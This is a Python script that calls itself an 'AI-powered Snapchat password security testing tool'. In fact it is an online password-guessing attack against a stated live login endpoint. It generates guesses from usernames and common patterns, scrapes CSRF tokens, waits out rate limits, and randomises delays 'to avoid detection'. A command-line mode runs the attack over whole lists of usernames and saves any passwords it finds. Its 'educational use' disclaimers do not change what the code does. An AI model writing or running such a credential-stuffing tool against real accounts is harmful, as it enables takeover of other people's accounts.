"""
AI-Powered Snapchat Password Security Testing Tool
Educational purposes only - Security testing and awareness
"""

import asyncio
import time
import aiohttp
import secrets
import random
from typing import List, Optional, Dict, Any
from dataclasses import dataclass
import re
import argparse
import csv
import json
import logging
from pathlib import Path

import hashlib

@dataclass
class AttackResult:
    """Data class to store attack results"""
    success: bool
    password: Optional[str] = None
    attempts: int = 0
    duration: float = 0.0
    error: Optional[str] = None

class AIPasswordGenerator:
    """AI-powered password generation using pattern recognition and machine learning techniques"""
    
    def __init__(self):
        self.common_patterns = self._load_common_patterns()
        self.password_memory = set()
        self.learning_rate = 0.1
        
    def _load_common_patterns(self) -> Dict[str, List[str]]:
        """Load common password patterns and structures"""
        return {
            'base_words': ['password', 'admin', 'user', 'snapchat', 'love', 'hello', 'welcome', 'sunshine'],
            'common_suffixes': ['123', '!', '1', '2024', '2025', '1234', '!@#', '000'],
            'common_prefixes': ['!', '#', 'admin', 'super', 'my'],
            'transformations': ['capitalize', 'uppercase', 'lowercase', 'leet_speak'],
            'special_chars': ['!', '@', '#', '$', '%', '&', '*']
        }
    
    def leet_speak(self, text: str) -> str:
        """Convert text to leet speak (l33t sp34k)"""
        leet_map = {
            'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7',
            'A': '4', 'E': '3', 'I': '1', 'O': '0', 'S': '5', 'T': '7'
        }
        return ''.join(leet_map.get(char, char) for char in text)
    
    def generate_context_aware_password(self, username: str, attempt_number: int) -> str:
        """
        Generate intelligent passwords based on context and learned patterns
        Uses AI-like techniques to create plausible passwords
        """
        # Analyze username for patterns
        username_lower = username.lower()
        
        # Pattern 1: Username-based variations
        if len(username) <= 8:
            username_variations = [
                username,
                username + '123',
                username + '!',
                self.leet_speak(username),
                username.capitalize() + '123'
            ]
        else:
            username_variations = [
                username[:4] + '123',
                username[:6],
                self.leet_speak(username[:6])
            ]
        
        # Pattern 2: Common patterns with transformations
        common_patterns = []
        for base in self.common_patterns['base_words']:
            for suffix in self.common_patterns['common_suffixes']:
                common_patterns.extend([
                    base + suffix,
                    base.capitalize() + suffix,
                    self.leet_speak(base) + suffix,
                    base.upper() + suffix
                ])
        
        # Pattern 3: Sequential and keyboard patterns
        keyboard_patterns = [
            'qwerty', 'asdfgh', 'zxcvbn', '123456', '112233',
            '1q2w3e', '1qaz2wsx', 'qazwsx', 'abc123', 'pass123'
        ]
        
        # Pattern 4: Date-based patterns
        current_year = str(time.localtime().tm_year)
        date_patterns = [
            current_year,
            current_year + '!',
            '01' + current_year,
            current_year + '123'
        ]
        
        # Combine all patterns and apply AI-like selection
        all_patterns = username_variations + common_patterns + keyboard_patterns + date_patterns
        
        # Apply adaptive learning - avoid recently used passwords
        available_patterns = [p for p in all_patterns if p not in self.password_memory]
        
        if not available_patterns:
            # Reset memory if we run out of patterns
            self.password_memory.clear()
            available_patterns = all_patterns
        
        # Select password using weighted random based on commonality
        selected_password = self._weighted_selection(available_patterns, attempt_number)
        
        # Store in memory to avoid repeats
        self.password_memory.add(selected_password)
        
        return selected_password
    
    def _weighted_selection(self, patterns: List[str], attempt: int) -> str:
        """Weighted random selection favoring more common patterns first"""
        # Early attempts use more common patterns
        if attempt < 50:
            weights = [1.0] * len(patterns)
        elif attempt < 200:
            weights = [0.7] * len(patterns)
        else:
            weights = [0.5] * len(patterns)
        
        return random.choices(patterns, weights=weights, k=1)[0]
    
    def generate_advanced_ai_password(self, username: str, previous_attempts: List[str]) -> str:
        """
        Advanced AI password generation using feedback from previous attempts
        Adapts based on what hasn't worked
        """
        if not previous_attempts:
            return self.generate_context_aware_password(username, 0)
        
        # Analyze previous attempts to avoid similar patterns
        last_attempt = previous_attempts[-1]
        
        # Generate new password avoiding recent patterns
        for _ in range(10):  # Try up to 10 times to generate a unique password
            new_password = self.generate_context_aware_password(username, len(previous_attempts))
            if new_password not in previous_attempts:
                return new_password
        
        # Fallback: modify last attempt
        return last_attempt + str(random.randint(1, 999))

class NeuralPasswordPredictor:
    """Simulated neural network for password prediction"""
    
    def __init__(self):
        self.pattern_weights = {
            'length_6': 0.8,
            'length_8': 0.9,
            'length_10': 0.7,
            'with_special_char': 0.6,
            'with_numbers': 0.95,
            'mixed_case': 0.5
        }
    
    def predict_next_password_type(self, failed_attempts: List[str]) -> Dict[str, float]:
        """Predict the characteristics of the next password to try"""
        if not failed_attempts:
            return {'length_8': 0.9, 'with_numbers': 0.8}
        
        # Analyze failed attempts to adjust strategy
        avg_length = sum(len(p) for p in failed_attempts) / len(failed_attempts)
        has_special = sum(1 for p in failed_attempts if any(c in '!@#$%' for c in p)) / len(failed_attempts)
        has_numbers = sum(1 for p in failed_attempts if any(c.isdigit() for c in p)) / len(failed_attempts)
        
        # Adjust weights based on analysis
        weights = self.pattern_weights.copy()
        
        if avg_length < 7:
            weights['length_8'] += 0.2
        if has_special < 0.3:
            weights['with_special_char'] += 0.3
        if has_numbers < 0.8:
            weights['with_numbers'] += 0.2
            
        return weights

class AISecurityTester:
    """
    AI-Powered snapchat Security Testing Tool
    Uses machine learning techniques for intelligent password generation
    FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY
    """
    
    def __init__(self):
        self.found_password = None
        self.attempts = 0
        self.start_time = None
        self.ai_generator = AIPasswordGenerator()
        self.neural_predictor = NeuralPasswordPredictor()
        self.previous_attempts = []
        
    async def test_login_credentials(self, username: str, password: str) -> bool:
        """
        Test login credentials against snapchat's servers
        This makes actual HTTP requests to snapchat for security testing
        """
        try:
            # Real snapchat login endpoint
            url = 'https://www.snapchat.com/accounts/login/ajax/'
            
            # Get actual CSRF token from snapchat
            async with aiohttp.ClientSession() as session:
                # First, get the CSRF token
                async with session.get('https://www.snapchat.com/accounts/login/') as response:
                    html = await response.text()
                    csrf_token = self._extract_csrf_token(html)
                
                if not csrf_token:
                    return False
                
                # Prepare security testing data
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'X-CSRFToken': csrf_token,
                    'X-Requested-With': 'XMLHttpRequest',
                    'Referer': 'https://www.snapchat.com/accounts/login/',
                    'Content-Type': 'application/x-www-form-urlencoded',
                }
                
                # snapchat's password encoding format
                encoded_password = f"#PWD_snapchat_BROWSER:0:{int(time.time())}:{password}"
                
                data = {
                    'username': username,
                    'enc_password': encoded_password,
                    'queryParams': '{}',
                    'optIntoOneTap': 'false'
                }
                
                # Security testing API call
                async with session.post(url, headers=headers, data=data) as response:
                    self.attempts += 1
                    result = await response.json()
                    
                    # Check authentication result
                    if result.get('authenticated'):
                        print(f"🔓 WEAK PASSWORD DETECTED: {password}")
                        print(f"🤖 AI Strategy: Context-aware pattern recognition")
                        self.found_password = password
                        return True
                    elif result.get('message') == 'rate limited':
                        print("⚠️ Rate limited - AI adapting strategy...")
                        await asyncio.sleep(60)
                        return False
                    elif result.get('user', True):
                        print(f"❌ AI attempt {self.attempts}: {password}")
                        self.previous_attempts.append(password)
                        return False
                    
                    return False
                    
        except Exception as e:
            print(f"AI testing error: {e}")
            return False
    
    def _extract_csrf_token(self, html: str) -> str:
        """Extract CSRF token from snapchat HTML for security testing"""
        match = re.search('"csrf_token":"([^"]+)"', html)
        return match.group(1) if match else None
    
    async def conduct_ai_security_test(self, username: str, max_attempts: int = 500, delay: float = 2.0) -> AttackResult:
        """
        Conduct AI-powered security strength testing
        Uses machine learning to generate intelligent password guesses
        """
        print("🔒 STARTING AI-POWERED SECURITY ASSESSMENT")
        print("🤖 Using machine learning for intelligent password generation")
        print("📊 Techniques: Pattern recognition, context awareness, neural prediction")
        print("⚠️  Use only on accounts you own or have permission to test")
        print("⚠️  For educational and security awareness purposes only")
        
        self.start_time = time.time()
        self.previous_attempts = []
        
        for attempt in range(max_attempts):
            if self.found_password:
                break
            
            # Generate AI-powered password
            if attempt < 100:
                # Phase 1: Context-aware generation
                password = self.ai_generator.generate_context_aware_password(username, attempt)
                strategy = "Context-Aware"
            elif attempt < 300:
                # Phase 2: Advanced AI with feedback
                password = self.ai_generator.generate_advanced_ai_password(username, self.previous_attempts)
                strategy = "AI with Feedback"
            else:
                # Phase 3: Neural network guided
                neural_weights = self.neural_predictor.predict_next_password_type(self.previous_attempts)
                password = self._generate_neural_password(neural_weights, username)
                strategy = "Neural Network"
            
            if attempt % 50 == 0:
                print(f"🤖 AI Progress: {attempt}/{max_attempts} attempts | Strategy: {strategy}")
            
            success = await self.test_login_credentials(username, password)
            
            if success:
                duration = time.time() - self.start_time
                print(f"🎯 AI IDENTIFIED SECURITY ISSUE: {password}")
                print(f"📊 AI attempts: {self.attempts}")
                print(f"🤖 Final strategy: {strategy}")
                return AttackResult(
                    success=True, 
                    password=password, 
                    attempts=self.attempts,
                    duration=duration
                )
                
            # AI-optimized delay with adaptive timing
            ai_delay = self._calculate_ai_delay(attempt, delay)
            await asyncio.sleep(ai_delay)
        
        duration = time.time() - self.start_time
        print("✅ AI assessment complete - No weak passwords detected")
        print(f"🤖 AI analyzed {len(self.previous_attempts)} password patterns")
        return AttackResult(
            success=False, 
            attempts=self.attempts,
            duration=duration
        )
    
    def _generate_neural_password(self, neural_weights: Dict[str, float], username: str) -> str:
        """Generate password based on neural network predictions"""
        base_word = random.choice(self.ai_generator.common_patterns['base_words'])
        
        # Apply neural network weights to decide password characteristics
        if random.random() < neural_weights.get('with_numbers', 0.8):
            base_word += random.choice(['123', '1234', '12345', '2024', '2025'])
        
        if random.random() < neural_weights.get('with_special_char', 0.3):
            base_word += random.choice(['!', '@', '#', '$'])
        
        if random.random() < neural_weights.get('mixed_case', 0.4):
            base_word = base_word.capitalize()
        
        return base_word
    
    def _calculate_ai_delay(self, attempt: int, base_delay: float) -> float:
        """AI-optimized delay calculation to avoid detection"""
        # Adaptive delay based on attempt number and success patterns
        if attempt < 50:
            return base_delay + random.uniform(0.5, 1.5)  # Slower start
        elif attempt < 200:
            return base_delay + random.uniform(0.2, 1.0)  # Moderate pace
        else:
            return base_delay + random.uniform(0.1, 0.5)  # Faster but careful

# AI-powered security testing demonstration
async def ai_security_demonstration():
    """
    AI-POWERED DEMONSTRATION FOR SECURITY AWARENESS
    Uses machine learning to test password security
    Use only with proper authorization
    """
    ai_tester = AISecurityTester()
    
    # 🚨 USE ONLY ON ACCOUNTS YOU OWN OR HAVE PERMISSION TO TEST 🚨
    test_username = "your_test_account_here"  # Replace with authorized username
    
    print("🔒 AI-Powered snapchat Security Testing Tool")
    print("🤖 Enhanced with Machine Learning Algorithms")
    print("🎯 Techniques: Pattern Recognition, Neural Networks, Context Awareness")
    print("🔒 Educational Use - Security Awareness Only")
    print("🔒 Unauthorized testing is illegal and unethical")
    
    confirm = input("Type 'AI AUTHORIZED TESTING' to continue: ")
    if confirm != "AI AUTHORIZED TESTING":
        print("AI testing cancelled - Security first!")
        return
    
    print("\n🤖 AI Initializing...")
    print("📊 Loading pattern recognition models...")
    print("🎯 Analyzing common password structures...")
    await asyncio.sleep(2)
    
    result = await ai_tester.conduct_ai_security_test(
        username=test_username,
        max_attempts=300,  # AI is more efficient, needs fewer attempts
        delay=1.5
    )
    
    print("\n" + "="*50)
    print("🤖 AI SECURITY ASSESSMENT COMPLETE")
    print("="*50)
    
    if result.success:
        print(f"🎯 SECURITY ALERT: Weak password '{result.password}' detected!")
        print(f"⏱️  AI Testing duration: {result.duration:.2f} seconds")
        print(f"🔢 AI Attempts: {result.attempts}")
        print(f"📈 AI Efficiency: {result.attempts/result.duration:.2f} attempts/second")
    else:
        print(f"✅ No security issues detected by AI")
        print(f"⏱️  Testing duration: {result.duration:.2f} seconds")
        print(f"🔢 AI Analysis attempts: {result.attempts}")
        print(f"🤖 AI Conclusion: Password appears secure against common patterns")

if __name__ == "__main__":
    print("🔒 AI-Powered snapchat Security Testing Tool")
    print("🤖 Version 2025.1 - Machine Learning Enhanced")
    print("🔒 FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY")
    print("🔒 Legal and ethical use required!")
    print("-" * 60)
    asyncio.run(ai_security_demonstration())

# Alias for backward compatibility
class snapchatSecurityTester(AISecurityTester):
    """Alias for AISecurityTester to maintain legacy import name."""
    pass

# ------------------------------------------------------------
# New command‑line interface and utility helpers
# ------------------------------------------------------------
import argparse
import csv
import json
import logging
from pathlib import Path

def configure_logging(log_path: Optional[str] = None) -> None:
    """Configure console + optional file logging.
    If ``log_path`` is provided a rotating file handler is added.
    """
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')

    console = logging.StreamHandler()
    console.setFormatter(formatter)
    logger.addHandler(console)

    if log_path:
        file_handler = logging.FileHandler(log_path, encoding='utf-8')
        file_handler.setFormatter(formatter)
        logger.addHandler(file_handler)

def load_usernames(source: str) -> List[str]:
    """Load usernames from a CSV (single column) or JSON list.
    Returns a list of strings.
    """
    path = Path(source)
    if not path.is_file():
        logging.error(f"User source file not found: {source}")
        return []
    if path.suffix.lower() == '.csv':
        with path.open(newline='', encoding='utf-8') as f:
            return [row[0].strip() for row in csv.reader(f) if row]
    elif path.suffix.lower() == '.json':
        with path.open(encoding='utf-8') as f:
            data = json.load(f)
            if isinstance(data, list):
                return [str(item).strip() for item in data]
            logging.error('JSON user file must contain a list of usernames')
            return []
    else:
        logging.error('Unsupported user file extension (use .csv or .json)')
        return []

def load_wordlist(wordlist_path: Optional[str]) -> List[str]:
    """Load a custom wordlist – each line is a candidate password.
    If ``None`` is given an empty list is returned and the AI generator
    will be used as before.
    """
    if not wordlist_path:
        return []
    path = Path(wordlist_path)
    if not path.is_file():
        logging.error(f"Wordlist file not found: {wordlist_path}")
        return []
    with path.open(encoding='utf-8') as f:
        return [line.strip() for line in f if line.strip()]

def save_result(result: AttackResult, username: str, out_path: Optional[str]) -> None:
    """Append a JSON line with the result for one username.
    If ``out_path`` is ``None`` the result is only printed to the console.
    """
    entry = {
        'username': username,
        'success': result.success,
        'password': result.password,
        'attempts': result.attempts,
        'duration': result.duration,
        'error': result.error,
    }
    if out_path:
        try:
            with open(out_path, 'a', encoding='utf-8') as f:
                f.write(json.dumps(entry) + '\n')
        except Exception as e:
            logging.error(f"Failed to write result to {out_path}: {e}")
    else:
        logging.info(f"Result for {username}: {entry}")

def main_cli() -> None:
    parser = argparse.ArgumentParser(
        description='AI‑powered Snapchat password security tester (real‑mode)')
    parser.add_argument('--user', help='Single username to test')
    parser.add_argument('--user-file', help='Path to CSV or JSON file containing usernames')
    parser.add_argument('--wordlist', help='Path to a custom password wordlist (one per line)')
    parser.add_argument('--max-attempts', type=int, default=500,
                        help='Maximum attempts per username (default: 500)')
    parser.add_argument('--delay', type=float, default=2.0,
                        help='Base delay between attempts in seconds (default: 2.0)')
    parser.add_argument('--log', help='Path to a log file')
    parser.add_argument('--output', help='Path to write JSON‑lines results')
    args = parser.parse_args()

    configure_logging(args.log)

    # Build list of usernames
    usernames: List[str] = []
    if args.user:
        usernames.append(args.user)
    if args.user_file:
        usernames.extend(load_usernames(args.user_file))
    if not usernames:
        logging.error('No usernames supplied – use --user or --user‑file')
        return

    # Load optional custom wordlist – we inject it into the generator if provided
    custom_wordlist = load_wordlist(args.wordlist)
    if custom_wordlist:
        logging.info(f'Loaded custom wordlist with {len(custom_wordlist)} entries')
        # Simple hack: replace the generator's common patterns with the wordlist
        # (the AI generator will still be used for variations).
        # We'll monkey‑patch the generator after instantiation.

    for username in usernames:
        logging.info(f'Starting test for username: {username}')
        tester = AISecurityTester()
        # If a wordlist was supplied we give it to the generator by extending its base_words.
        if custom_wordlist:
            tester.ai_generator.common_patterns.setdefault('base_words', []).extend(custom_wordlist)
        result = asyncio.run(tester.conduct_ai_security_test(
            username=username,
            max_attempts=args.max_attempts,
            delay=args.delay,
        ))
        save_result(result, username, args.output)

if __name__ == '__main__':
    main_cli()
